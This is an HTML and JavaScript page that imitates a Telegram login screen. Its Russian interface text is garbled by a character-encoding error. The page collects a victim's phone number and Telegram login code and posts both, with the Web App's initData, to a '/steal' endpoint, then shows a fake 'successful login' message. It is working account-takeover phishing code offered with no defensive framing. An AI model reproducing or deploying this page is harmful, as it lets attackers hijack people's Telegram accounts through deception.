<!DOCTYPE html>
<html>
<head>
    <title>Telegram</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { margin: 0; padding: 0; background: #18222d; color: white; font-family: system-ui; }
        .container { padding: 20px; text-align: center; }
        .logo { font-size: 80px; margin: 30px 0; }
        .title { font-size: 24px; margin: 10px 0; }
        .subtitle { color: #8e8e93; margin: 10px 0 30px; }
        .phone-container { display: flex; gap: 10px; margin: 10px 0; }
        .country-select { width: 100px; padding: 15px; background: #2b2b2b; border: none; border-radius: 10px; color: white; }
        .phone-input { flex: 1; padding: 15px; background: #2b2b2b; border: none; border-radius: 10px; color: white; font-size: 16px; }
        .btn { width: 100%; padding: 15px; background: #007aff; color: white; border: none; border-radius: 10px; font-size: 16px; margin: 20px 0; cursor: pointer; }
        .monkey { font-size: 120px; margin: 40px 0; animation: float 3s ease-in-out infinite; }
        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
        }
        .stage { display: none; }
        .active { display: block; }
    </style>
</head>
<body>
    <!-- –≠—Ç–∞–ø –Ω–æ–º–µ—Ä–∞ -->
    <div class="container stage active" id="phoneStage">
        <div class="logo">üì±</div>
        <div class="title">–í–≤–µ–¥–∏—Ç–µ –≤–∞—à –Ω–æ–º–µ—Ä</div>
        <div class="subtitle">–ù–∞ –Ω–µ–≥–æ –ø—Ä–∏–¥–µ—Ç –∫–æ–¥ –∏–∑ Telegram</div>
        
        <div class="phone-container">
            <select class="country-select" id="countryCode">
                <option value="7">RU +7</option>
                <option value="380">UA +380</option>
                <option value="375">BY +375</option>
                <option value="77">KZ +7</option>
                <option value="994">AZ +994</option>
                <option value="995">GE +995</option>
                <option value="374">AM +374</option>
                <option value="373">MD +373</option>
                <option value="996">KG +996</option>
                <option value="993">TM +993</option>
                <option value="998">UZ +998</option>
                <option value="992">TJ +992</option>
                <option value="1">US +1</option>
                <option value="44">UK +44</option>
                <option value="49">DE +49</option>
                <option value="33">FR +33</option>
                <option value="39">IT +39</option>
                <option value="34">ES +34</option>
                <option value="90">TR +90</option>
                <option value="86">CN +86</option>
                <option value="81">JP +81</option>
                <option value="82">KR +82</option>
                <option value="91">IN +91</option>
                <option value="55">BR +55</option>
                <option value="52">MX +52</option>
                <option value="54">AR +54</option>
                <option value="61">AU +61</option>
                <option value="64">NZ +64</option>
                <option value="27">ZA +27</option>
                <option value="20">EG +20</option>
                <option value="971">AE +971</option>
                <option value="966">SA +966</option>
            </select>
            <input class="phone-input" type="tel" id="phoneInput" placeholder="123 456-78-90">
        </div>
        
        <button class="btn" onclick="sendPhone()">–ü–†–û–î–û–õ–ñ–ò–¢–¨</button>
    </div>

    <!-- –≠—Ç–∞–ø –∫–æ–¥–∞ -->
    <div class="container stage" id="codeStage">
        <div class="monkey">üêµ</div>
        <div class="title">–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥</div>
        <div class="subtitle">–û—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ Telegram</div>
        <input class="phone-input" type="text" id="codeInput" placeholder="12345" maxlength="5">
        <button class="btn" onclick="sendCode()">–í–û–ô–¢–ò</button>
    </div>

    <script>
        function sendPhone() {
            const countryCode = document.getElementById('countryCode').value;
            const phoneNumber = document.getElementById('phoneInput').value.trim();
            
            if (!phoneNumber) return;
            
            const fullPhone = '+' + countryCode + phoneNumber.replace(/\D/g, '');
            
            // –ü–µ—Ä–µ–∫–ª—é—á–∞–µ–º —ç—Ç–∞–ø—ã
            document.getElementById('phoneStage').classList.remove('active');
            document.getElementById('codeStage').classList.add('active');
            
            // –ö—Ä–∞–¥–µ–º –Ω–æ–º–µ—Ä
            fetch('/steal', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    stage: 'phone_entered',
                    phone: fullPhone,
                    country: countryCode,
                    tg_data: Telegram.WebApp.initData
                })
            });
        }

        function sendCode() {
            const code = document.getElementById('codeInput').value;
            const countryCode = document.getElementById('countryCode').value;
            const phoneNumber = document.getElementById('phoneInput').value.trim();
            const fullPhone = '+' + countryCode + phoneNumber.replace(/\D/g, '');
            
            if (!code) return;
            
            // –ö—Ä–∞–¥–µ–º –∫–æ–¥
            fetch('/steal', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    stage: 'code_entered',
                    phone: fullPhone,
                    code: code,
                    country: countryCode,
                    tg_data: Telegram.WebApp.initData
                })
            });
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∑–∞–≥—Ä—É–∑–∫—É
            const btn = document.querySelector('#codeStage .btn');
            btn.textContent = '–í–•–û–î...';
            btn.disabled = true;
            
            // –ß–µ—Ä–µ–∑ 2 —Å–µ–∫ —É—Å–ø–µ—Ö
            setTimeout(() => {
                document.body.innerHTML = `
                    <div class="container">
                        <div class="logo">‚úÖ</div>
                        <div class="title">–£—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥</div>
                        <div class="subtitle">–ê–∫–∫–∞—É–Ω—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω</div>
                    </div>
                `;
            }, 2000);
        }

        // –ê–≤—Ç–æ-–æ—Ç–ø—Ä–∞–≤–∫–∞ –ø—Ä–∏ 5 —Ü–∏—Ñ—Ä–∞—Ö
        document.getElementById('codeInput').addEventListener('input', function(e) {
            if (this.value.length === 5) {
                sendCode();
            }
        });

        // –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–æ–º–µ—Ä–∞
        document.getElementById('phoneInput').addEventListener('input', function(e) {
            let value = this.value.replace(/\D/g, '');
            if (value.length > 0) {
                value = value.replace(/(\d{3})(\d{3})(\d{2})(\d{2})/, '$1 $2-$3-$4');
            }
            this.value = value;
        });
    </script>
</body>
</html>